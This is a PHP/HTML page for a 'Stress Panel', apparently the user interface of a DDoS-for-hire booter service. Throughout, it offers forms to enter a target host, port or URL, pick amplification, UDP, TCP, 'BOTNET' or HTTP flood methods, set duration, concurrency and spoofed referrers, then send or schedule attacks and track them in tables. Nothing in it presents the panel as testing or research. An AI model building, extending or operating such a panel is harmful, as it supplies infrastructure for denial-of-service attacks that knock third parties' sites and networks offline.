
<?php
$pagename = "Stress Panel";
include 'header.php';
?>


<div class="main">
  	<div class="container mt-5 px-4">
  		<div class="row g-4">
  			<div class="col-md-4">
  				<div class="card rounded-lg stress-div bg-gray-800">
  					<div class="card-header">
  						Stress Panel
  					</div>

  					<div class="card-body">
  						<div class="mx-2">

		  					<ul class="nav stress-tabs" role="tablist">
		  						<li class="col-6" role="presentation" style="flex: 0 0 50%;max-width: 50%;">
		  							<a href="#" class="active" style="margin-right: 10px;" id="layer4-tab" data-bs-toggle="tab" data-bs-target="#layer4-pane" type="button" role="tab" aria-controls="layer4-pane" aria-selected="true">Layer 4</a>
		  						</li>
		  						<li class="col-6" role="presentation" style="flex: 0 0 50%;max-width: 50%;">
		  							<a href="#" class="" style="margin-left: 10px;" id="layer7-tab" data-bs-toggle="tab" data-bs-target="#layer7-pane" type="button" role="tab" aria-controls="layer7-pane" aria-selected="true">Layer 7</a>
		  						</li>
		  					</ul>
		  					<div class="tab-content">
							  <div class="tab-pane fade show active" id="layer4-pane" role="tabpanel" aria-labelledby="layer4-tab" tabindex="0">
							  	<div class="row mt-3">
							  		<div class="col-md-8">
							  			<div class="mb-3">
										    <label for="l4host" class="form-label">Host</label>
										    <input type="text" class="form-control" placeholder="1.1.1.1" id="l4host" required>
										    
										</div>
							  		</div>
							  		<div class="col-md-4">
							  			<div class="mb-3">
										    <label for="l4port" class="form-label">Port</label>
										    <input type="number" class="form-control" id="l4port" placeholder="80" required>
										    
										</div>
							  		</div>
							  		<div class="col-md-12">
							  			<div class="mb-3">
										    <label for="l4time" class="form-label">Time</label>
										    <input type="number" class="form-control" id="l4time" placeholder="60" required>
										    
										</div>
							  		</div>
							  		<div class="col-md-12">
							  			<div class="mb-3">
								  			<label for="l4method" class="form-label">Attack Method</label>
								  			<select class="form-select" id="l4method">
											  
											  	<optgroup label="Amplification (AMP)" style="color: #8DA2FB;">
												  <?php
$SelectL7 = $odb->query("SELECT * FROM `methods` WHERE `type` = 'AMP' ORDER BY `id` ASC");
while ($methodinfo = $SelectL7->fetch(PDO::FETCH_ASSOC)) {
    $apiname = $methodinfo['apiname'];
    $publicname = $methodinfo['publicname'];
    echo '<option value="' . $apiname . '">' . $publicname . '</option>';
}
?>
											  	</optgroup>
											  	<optgroup label="User Datagram Protocol (UDP)" style="color: #E74694;">
												  <?php
$SelectL7 = $odb->query("SELECT * FROM `methods` WHERE `type` = 'UDP' ORDER BY `id` ASC");
while ($methodinfo = $SelectL7->fetch(PDO::FETCH_ASSOC)) {
    $apiname = $methodinfo['apiname'];
    $publicname = $methodinfo['publicname'];
    echo '<option value="' . $apiname . '">' . $publicname . '</option>';
}
?>
											  	</optgroup>
											  	<optgroup label="Transmission Control Protocol (TCP)" style="color: #5850EC;">
												  <?php
$SelectL7 = $odb->query("SELECT * FROM `methods` WHERE `type` = 'TCP' ORDER BY `id` ASC");
while ($methodinfo = $SelectL7->fetch(PDO::FETCH_ASSOC)) {
    $apiname = $methodinfo['apiname'];
    $publicname = $methodinfo['publicname'];
    echo '<option value="' . $apiname . '">' . $publicname . '</option>';
}
?>
											  	</optgroup>
											  	<optgroup label="Premium Methods" style="color: #F05252;">
												  <?php
$SelectL7 = $odb->query("SELECT * FROM `methods` WHERE `type` = 'BOTNET' ORDER BY `id` ASC");
while ($methodinfo = $SelectL7->fetch(PDO::FETCH_ASSOC)) {
    $apiname = $methodinfo['apiname'];
    $publicname = $methodinfo['publicname'];
    echo '<option value="' . $apiname . '">' . $publicname . '</option>';
}
?>
											  	</optgroup>
											</select>
										</div>
							  		</div>
							  		<div class="col-md-12">
							  			<div class="mb-4">
							  				<label for="l4concsi" class="form-label">Concurrents</label>
							  	
											<div class="d-flex">
												<div id="l4concs" class="rounded-slider"></div>
												<span id="l4concs_num" value="" class="rounded-slider-num"></span>
												
												
											</div>
										</div>
							  		</div>
							  		<div class="col-md-12 text-center">
							  			<div class="mb-3">
							  				<button type="button" onclick="StartL4Attack()" id="l4btn" class="btn btn-vnm-indigo w-100 py-2">
							  					<span id="l4_def"><i class="fa-solid fa-bolt"></i>
											 	 Send Attack
											 	</span>
                                				<span id="l4_loadi" style="display: none;"><span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> 
                                				 Please wait...
                                				</span>
											  
											</button>

							  			</div>
							  		</div>

							  	</div>

							  </div>
							  <div class="tab-pane fade" id="layer7-pane" role="tabpanel" aria-labelledby="layer7-tab" tabindex="0">
							  	<div class="row mt-3">
							  		<div class="col-md-8">
							  			<div class="mb-3">
										    <label for="l7host" class="form-label">URL</label>
										    <input type="text" class="form-control" placeholder="https://example.com" id="l7host" required>
										    
										</div>
							  		</div>
							  		<div class="col-md-4">
							  			<div class="mb-3">
										    <label for="l7time" class="form-label">Time</label>
										    <input type="number" class="form-control" id="l7time" placeholder="60" required>
										    
										</div>
							  		</div>
							  		
							  		<div class="col-md-12">
							  			<div class="mb-3">
								  			<label for="l7method" class="form-label">Attack Method</label>
								  			<select class="form-select" id="l7method" onclick="CheckL7Method()">
											  	<optgroup label="Basic" style="color: #8DA2FB;">
												  <?php
$SelectL7 = $odb->query("SELECT * FROM `methods` WHERE `type` = 'BASICL7' ORDER BY `id` ASC");
while ($methodinfo = $SelectL7->fetch(PDO::FETCH_ASSOC)) {
    $apiname = $methodinfo['apiname'];
    $publicname = $methodinfo['publicname'];
    echo '<option value="' . $apiname . '">' . $publicname . '</option>';
}
?>
											  	</optgroup>
											  	<optgroup label="Premium" style="color: #D61F69;">
												  <?php
$SelectL7 = $odb->query("SELECT * FROM `methods` WHERE `type` = 'PREMIUML7' ORDER BY `id` ASC");
while ($methodinfo = $SelectL7->fetch(PDO::FETCH_ASSOC)) {
    $apiname = $methodinfo['apiname'];
    $publicname = $methodinfo['publicname'];
    echo '<option value="' . $apiname . '">' . $publicname . '</option>';
}
?>
											  	</optgroup>
											</select>
										</div>
							  		</div>
							  		
							  		<div class="col-md-6">
							  			<div class="mb-3">
							  				<label for="l7reqmethod" class="form-label">Request Method</label>
								  			<select class="form-select" id="l7reqmethod">
											  <option value="GET">GET</option>
											  <option value="POST">POST</option>
											</select>
							  			</div>
							  		</div>
							  		<div class="col-md-6">
							  			<div class="mb-3">
							  				<label for="l7reqs" class="form-label">Requests per IP</label>
										    <input type="number" class="form-control" id="l7reqs" placeholder="64" required>

							  			</div>
							  		</div>
							  		<div class="col-md-12">
							  			<div class="mb-4">
							  				<label for="l7concsi" class="form-label">Concurrents</label>
							  				
											<div class="d-flex">
												<div id="l7concs" class="rounded-slider"></div>
												<span id="l7concs_num" class="rounded-slider-num"></span>
												
											</div>
										</div>
							  		</div>
							  		<div class="col-md-12">
							  			<div class="mb-4 text-center" style="display:none;">
							  				<a class="advanced-drop" id="advanced-drop" data-bs-toggle="collapse" href="#advancedcoll" role="button" aria-expanded="false" aria-controls="advancedcoll">Show Advanced Options <i class="fa-solid fa-caret-down"></i></a>

							  			</div>

							  		</div>
							  		<div class="col-md-12">
							  			<div class="collapse" id="advancedcoll">
							  				<div class="row">
							  					<div class="col-md-6">
							  						<div class="mb-3">
										  				<label for="l7version" class="form-label">HTTP Version (Optional)</label>
													    <select class="form-select" id="l7version">
													      
											  			  <option value="HTTP1" selected>HTTP/1</option>
														  <option value="HTTP2">HTTP/2</option>
														  
														</select>

										  			</div>
							  						
							  					</div>
							  					<div class="col-md-6">
							  						<div class="mb-3">
										  				<label for="l7referrer" class="form-label">Referrer (Optional)</label>
													    <input type="text" class="form-control" id="l7referrer" autocomplete="off" placeholder="https://google.com/search?q=%RAND%" required>

										  			</div>
							  					</div>
							  					<div class="col-md-6">
							  						<div class="mb-3">
										  				<label for="l7cookies" class="form-label">Cookies (Optional)</label>
													    <input type="text" class="form-control" id="l7cookies" autocomplete="off" placeholder="PHPSESSID=21ec04f8ecade508794839f9bc250454;" required>

										  			</div>
							  					</div>
							  					<div class="col-md-6">
							  						<div class="mb-3">
										  				<label for="l7geo" class="form-label">Geolocation (Optional)</label>
													    <select class="form-select" id="l7geo">
													      <option value="rand">Worldwide</option>
											  			  <option value="us">United States</option>
														  	<option value="eu">Europe</option>
														  	<option value="ch">China</option>
														  	<option value="au">Australia</option>
														</select>

										  			</div>
							  					</div>

							  				</div>
							  			</div>

							  		</div>
							  		<div class="col-md-12 text-center">
							  			<div class="mb-3">
							  				<button type="button" onclick="StartL7Attack()" class="btn btn-vnm-indigo w-100 py-2">
							  					<span id="l7_def"><i class="fa-solid fa-bolt"></i>
											 	 Send Attack
											 	</span>
                                				<span id="l7_loadi" style="display: none;"><span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> 
                                				 Please wait..
                                				</span>
											  
											</button>

							  			</div>
							  		</div>


							  	</div>

							  </div>
							  
							</div>
		  				</div>
					</div>
					<input type="text" name="csrf" id="csrf_token" hidden value="<?php echo $aWAF->getCSRF(); ?>">






  				</div>
  			</div>

  			<div class="col-md-8">
  				<div class="card rounded-lg attacks-div bg-gray-800 g-4">
  					<div class="card-header">
  						<div class="row">
	  						<div class="col-md-6">
		  						<div class="text-start">
		  						Attacks
		  						</div>
		  					</div>
		  					<div class="col-md-6">
		  						<div class="text-end">
		  							<button type="button" style="text-transform: uppercase; font-size: 0.8rem;font-weight: 400 !important;background: #6875f5 !important;border:none !important;" id="shedulebtn" onclick="OpenSchedule()" class="btn btn-primary btn-sm"><span id="shedule_def"><i class="fa-solid fa-calendar-days"></i> Schedule</span><span id="shedule_loadi" style="display: none;"><span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Please wait..</span></button>
		  							
		  							
		  						</div>
		  					</div>
	  					</div>
  					</div>

  					<div class="card-body">
  						<div>
  							<div class="table-responsive mx-2">
			                  <table id="attacks-table" style="width:100%" class="mt-2 stripe display table bg-gray-800 table-striped table-bordered border-gray">
			                    <thead>
			                      <tr>
			                        <th scope="col" class="text-start">ID</th>
			                        <th scope="col" class="text-center">Target</th>
			                        <th scope="col" class="text-center">Method</th>
			                        <th scope="col" class="text-center">Expire</th>
			                        <th scope="col" class="text-center">Action</th>
			                      </tr>
			                    </thead>
			                    
			                  </table>
			                </div>
						</div>
  					</div>
  				</div>

  			</div>
  		</div>





  	</div>
</div>

	



	  <div class="modal fade" id="schedule-modal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
        <div class="modal-dialog modal-sm modal-dialog-centered modal-dialog-scrollable">
          <div class="modal-content bg-gray-800">
            <div class="modal-header">
              Schedule Attack
              <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
            </div>
            <div class="modal-body">
              			   <ul class="nav stress-tabs" role="tablist">
		  						<li class="col-6" role="presentation" style="flex: 0 0 50%;max-width: 50%;">
		  							<a href="#" class="active" style="margin-right: 10px;" id="layer4sch-tab" data-bs-toggle="tab" data-bs-target="#layer4sch-pane" type="button" role="tab" aria-controls="layer4sch-pane" aria-selected="true">Layer 4</a>
		  						</li>
		  						<li class="col-6" role="presentation" style="flex: 0 0 50%;max-width: 50%;">
		  							<a href="#" class="" style="margin-left: 10px;" id="layer7sch-tab" data-bs-toggle="tab" data-bs-target="#layer7sch-pane" type="button" role="tab" aria-controls="layer7sch-pane" aria-selected="true">Layer 7</a>
		  						</li>
		  					</ul>
		  					<div class="tab-content">
							  <div class="tab-pane fade show active" id="layer4sch-pane" role="tabpanel" aria-labelledby="layer4sch-tab" tabindex="0">
							  	<div class="row mt-3">
							  		<div class="col-md-8">
							  			<div class="mb-3">
										    <label for="l4hostsch" class="form-label">Host</label>
										    <input type="text" class="form-control" placeholder="1.1.1.1" id="l4hostsch" required>
										    
										</div>
							  		</div>
							  		<div class="col-md-4">
							  			<div class="mb-3">
										    <label for="l4portsch" class="form-label">Port</label>
										    <input type="number" class="form-control" id="l4portsch" placeholder="80" required>
										    
										</div>
							  		</div>
							  		<div class="col-md-12">
							  			<div class="mb-3">
										    <label for="l4timesch" class="form-label">Time</label>
										    <input type="number" class="form-control" id="l4timesch" placeholder="60" required>
										    
										</div>
							  		</div>
							  		<div class="col-md-12">
							  			<div class="mb-3">
								  			<label for="l4methodsch" class="form-label">Attack Method</label>
								  			<select class="form-select" id="l4methodsch">
											  
											  	
											  	<optgroup label="Amplification (AMP)" style="color: #8DA2FB;">
												  <?php
$SelectL7 = $odb->query("SELECT * FROM `methods` WHERE `type` = 'AMP' ORDER BY `id` ASC");
while ($methodinfo = $SelectL7->fetch(PDO::FETCH_ASSOC)) {
    $apiname = $methodinfo['apiname'];
    $publicname = $methodinfo['publicname'];
    echo '<option value="' . $apiname . '">' . $publicname . '</option>';
}
?>
											  	</optgroup>
											  	<optgroup label="User Datagram Protocol (UDP)" style="color: #E74694;">
												  <?php
$SelectL7 = $odb->query("SELECT * FROM `methods` WHERE `type` = 'UDP' ORDER BY `id` ASC");
while ($methodinfo = $SelectL7->fetch(PDO::FETCH_ASSOC)) {
    $apiname = $methodinfo['apiname'];
    $publicname = $methodinfo['publicname'];
    echo '<option value="' . $apiname . '">' . $publicname . '</option>';
}
?>
											  	</optgroup>
											  	<optgroup label="Transmission Control Protocol (TCP)" style="color: #5850EC;">
												  <?php
$SelectL7 = $odb->query("SELECT * FROM `methods` WHERE `type` = 'TCP' ORDER BY `id` ASC");
while ($methodinfo = $SelectL7->fetch(PDO::FETCH_ASSOC)) {
    $apiname = $methodinfo['apiname'];
    $publicname = $methodinfo['publicname'];
    echo '<option value="' . $apiname . '">' . $publicname . '</option>';
}
?>
											  	</optgroup>
											  	<optgroup label="SPECIAL" style="color: #F05252;">
												  <?php
$SelectL7 = $odb->query("SELECT * FROM `methods` WHERE `type` = 'SPECIAL' ORDER BY `id` ASC");
while ($methodinfo = $SelectL7->fetch(PDO::FETCH_ASSOC)) {
    $apiname = $methodinfo['apiname'];
    $publicname = $methodinfo['publicname'];
    echo '<option value="' . $apiname . '">' . $publicname . '</option>';
}
?>
											  	</optgroup>
											</select>
										</div>
							  		</div>
							  		<div class="col-md-12">
							  			<div class="mb-3">
										    <label for="l4datetimesch" class="form-label">Datetime</label>
										    <input type="datetime-local" class="form-control" id="l4datetimesch" required>
										    
										</div>
							  		</div>
							  		
							  		<div class="col-md-12 text-center">
							  			<div class="mb-3">
							  				<button type="button" onclick="ScheduleL4Attack()" id="l4btnsch" class="btn btn-vnm-indigo w-100 py-2">
							  					<span id="l4sch_def"><i class="fa-solid fa-calendar-plus"></i>
											 	 Schedule Attack
											 	</span>
                                				<span id="l4sch_loadi" style="display: none;"><span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> 
                                				 Please wait...
                                				</span>
											  
											</button>

							  			</div>
							  		</div>

							  	</div>

							  </div>
							  <div class="tab-pane fade" id="layer7sch-pane" role="tabpanel" aria-labelledby="layer7sch-tab" tabindex="0">
							  	<div class="row mt-3">
							  		<div class="col-md-8">
							  			<div class="mb-3">
										    <label for="l7hostsch" class="form-label">URL</label>
										    <input type="text" class="form-control" placeholder="https://example.com" id="l7hostsch" required>
										    
										</div>
							  		</div>
							  		<div class="col-md-4">
							  			<div class="mb-3">
										    <label for="l7timesch" class="form-label">Time</label>
										    <input type="number" class="form-control" id="l7timesch" placeholder="60" required>
										    
										</div>
							  		</div>
							  		
							  		<div class="col-md-12">
							  			<div class="mb-3">
								  			<label for="l7methodsch" class="form-label">Attack Method</label>
								  			<select class="form-select" id="l7methodsch">
								  				
											  	<optgroup label="Basic" style="color: #8DA2FB;">
												  <?php
$SelectL7 = $odb->query("SELECT * FROM `methods` WHERE `type` = 'BASICL7' ORDER BY `id` ASC");
while ($methodinfo = $SelectL7->fetch(PDO::FETCH_ASSOC)) {
    $apiname = $methodinfo['apiname'];
    $publicname = $methodinfo['publicname'];
    echo '<option value="' . $apiname . '">' . $publicname . '</option>';
}
?>
											  	</optgroup>
											  	<optgroup label="Premium" style="color: #D61F69;">
												  <?php
$SelectL7 = $odb->query("SELECT * FROM `methods` WHERE `type` = 'PREMIUML7' ORDER BY `id` ASC");
while ($methodinfo = $SelectL7->fetch(PDO::FETCH_ASSOC)) {
    $apiname = $methodinfo['apiname'];
    $publicname = $methodinfo['publicname'];
    echo '<option value="' . $apiname . '">' . $publicname . '</option>';
}
?>
											  	</optgroup>
											</select>
										</div>
							  		</div>
							  		
							  		<div class="col-md-6">
							  			<div class="mb-3">
							  				<label for="l7reqmethodsch" class="form-label">Request Method</label>
								  			<select class="form-select" id="l7reqmethodsch">
											  <option value="GET">GET</option>
											  <option value="POST">POST</option>
											</select>
							  			</div>
							  		</div>
							  		<div class="col-md-6">
							  			<div class="mb-3">
							  				<label for="l7reqssch" class="form-label">Requests per IP</label>
										    <input type="number" class="form-control" id="l7reqssch" placeholder="64" required>

							  			</div>
							  		</div>
							  		<div class="col-md-12">
							  			<div class="mb-3">
										    <label for="l7datetimesch" class="form-label">Datetime</label>
										    <input type="datetime-local" class="form-control" id="l7datetimesch" required>
										    
										</div>
							  		</div>
							  		<div class="col-md-12 text-center">
							  			<div class="mb-3">
							  				<button type="button" onclick="ScheduleL7Attack()" id="l7btnsch" class="btn btn-vnm-indigo w-100 py-2">
							  					<span id="l7sch_def"><i class="fa-solid fa-calendar-plus"></i>
											 	 Schedule Attack
											 	</span>
                                				<span id="l7sch_loadi" style="display: none;"><span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> 
                                				 Please wait..
                                				</span>
											  
											</button>

							  			</div>
							  		</div>


							  	</div>

							  </div>
							  <button type="button" onclick="ScheduledAttacks()" class="btn btn-vnm-indigo w-100 py-2"><i class="fa-solid fa-list"></i> Scheduled Attacks</button>
							</div>
            </div>
            
              
            </div>
          </div>
        </div>
      </div>




      <div class="modal fade" id="scheduled-modal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
        <div class="modal-dialog modal-lg modal-dialog-centered modal-dialog-scrollable">
          <div class="modal-content bg-gray-800">
            <div class="modal-header">
              Scheduled Attacks
              <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
            </div>
            <div class="modal-body">
              <div class="table-responsive mx-2">
	              <table id="scheduled-table" style="width:100%" class="mt-2 stripe display table bg-grayy-800 table-striped table-bordered border-gray">
	                <thead>
	                  <tr>
	                    
	                    <th scope="col" class="text-start">#</th>
	                    <th scope="col" class="text-center">Target</th>
	                    <th scope="col" class="text-center">Method</th>
	                    <th scope="col" class="text-center">Created</th>
	                    <th scope="col" class="text-center">Scheduled</th>
	                    <th scope="col" class="text-center">Action</th>
	                  </tr>
	                </thead>
	                
	              </table>
	            </div>
            </div>
            <div class="modal-footer">
              <button type="button" class="btn btn-vnm-red py-2" id="closeschedule-btn" data-bs-dismiss="modal" aria-label="Close"><i class="fa-solid fa-xmark" style="color: #fff !important;"></i> Cancel
              
            </div>
          </div>
        </div>
      </div>


      </div>
    </div>

<script>
var l4concs = document.getElementById('l4concs');
var l4concspan = document.getElementById('l4concs_num');
noUiSlider.create(l4concs, {
    start: [1],
    connect: 'lower',
    step: 1,
    keyboardSupport: false, 
    format: wNumb({
        decimals: 0,
        
    }),
    range: {
        'min': 0,
        'max': 10
    }
    
});
l4concs.noUiSlider.on('update', function(values, handle) {
    l4concspan.innerHTML = values[handle];
    
});

var l7concs = document.getElementById('l7concs');
var l7concspan = document.getElementById('l7concs_num');
noUiSlider.create(l7concs, {
    start: [1],
    connect: 'lower',
    step: 1,
    keyboardSupport: false, 
    format: wNumb({
        decimals: 0,
        
    }),
    range: {
        'min': 0,
        'max': 10
    }
    
});
l7concs.noUiSlider.on('update', function(values, handle) {
    l7concspan.innerHTML = values[handle];
});


</script>

<script>

</script>
























<?php include 'footer.php'; ?>